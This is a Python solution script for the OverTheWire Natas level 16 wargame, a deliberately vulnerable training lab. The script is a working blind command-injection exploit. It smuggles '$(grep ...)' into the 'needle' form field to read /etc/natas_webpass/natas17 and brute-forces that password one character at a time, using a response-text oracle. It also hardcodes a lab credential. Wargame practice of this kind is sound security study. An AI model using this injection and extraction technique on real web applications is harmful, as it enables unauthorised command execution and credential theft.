#!/usr/bin/env python3
import requests

url = 'http://natas16.natas.labs.overthewire.org'
s = requests.Session()
s.auth = ('natas16', 'TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V')
character = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'


def is_in(data):
    req = s.post(url, data = data)
    return "Fahrenheits" not in req.text


def alph_in():
    char_selected = ''
    for var in character:
        data = {'needle': f'Fahrenheits$(grep {var} /etc/natas_webpass/natas17)'}
        if is_in(data):
            char_selected += var
            print(char_selected)
    return char_selected

def correct_seq(char_selected):
    cs = ''
    for i in range(32):
        for var in char_selected:
            data = {'needle': f'Fahrenheits$(grep ^{cs}{var} /etc/natas_webpass/natas17)'}
            if is_in(data):
                cs += var
                print(cs)
                break
    return cs

char_selected = alph_in()
print('\n\nFind correct sequence!!!')
cs = correct_seq(char_selected)
print(cs)



